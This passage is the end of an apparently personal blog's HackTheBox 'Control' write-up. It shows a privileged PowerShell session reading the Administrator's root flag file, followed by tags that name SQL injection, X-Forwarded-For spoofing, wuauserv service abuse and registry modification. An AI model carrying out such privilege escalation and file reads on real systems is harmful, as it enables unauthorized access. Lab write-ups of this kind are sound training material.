</span></pre></table></code></div></div><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Windows\system32</span><span class="err">&gt;</span><span class="nx">cat</span><span class="w"> </span><span class="nx">/Users/Administrator/Desktop/root.txt</span><span class="w">
</span><span class="mi">8</span><span class="nf">f8613----------------------ec1b1</span><span class="w">
</span></pre></table></code></div></div><p>Thanks for reading a single feedback will be appreciated !!!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/retired/'>retired</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/x-forward-for/" class="post-tag no-text-decoration" >x-forward-for</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/wuauserv-abusing/" class="post-tag no-text-decoration" >wuauserv-abusing</a> <a href="/tags/modifying-registryry/" class="post-tag no-text-decoration" >modifying-registryry</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Control writeup - 0xPrashant&url=http://localhost:4000/posts/htb-control/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Control writeup - 0xPrashant&u=http://localhost:4000/posts/htb-control/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Control writeup - 0xPrashant&url=http://localhost:4000/posts/htb-control/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-cache/"><div class="card-body"> <span class="timeago small" > May 10 <i class="unloaded">2020-05-10T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Cache writeup</h3><div class="text-muted small"><p> I got the root flag first becasue i was able to pwn root wihout getting ash user credentials Introduction@cache:~$ Column Details Name Cache ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-travel/"><div class="card-body"> <span class="timeago small" > May 21 <i class="unloaded">2020-05-21T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Travel writeup</h3><div class="text-muted small"><p> Introduction@Travel:~$ Column Details Name Travel IP 10.10.10.189 Points 40 Os Li...</p></div></div></a></div><div class="card"> <a href="/posts/htb-blunder/"><div class="card-body"> <span class="timeago small" > May 30 <i class="unloaded">2020-05-30T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Blunder writeup</h3><div class="text-muted small"><p> Introduction@Blunder:~$ Column Details Name Blunder IP 10.10.10.191 Points 20 Os ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-traverxec/" class="btn btn-outline-primary"><p>Hackthebox Traverxec writeup</p></a> <a href="/posts/htb-json/" class="btn btn-outline-primary"><p>Hackthebox Json writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-control/'; this.page.identifier = '/posts/htb-control/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
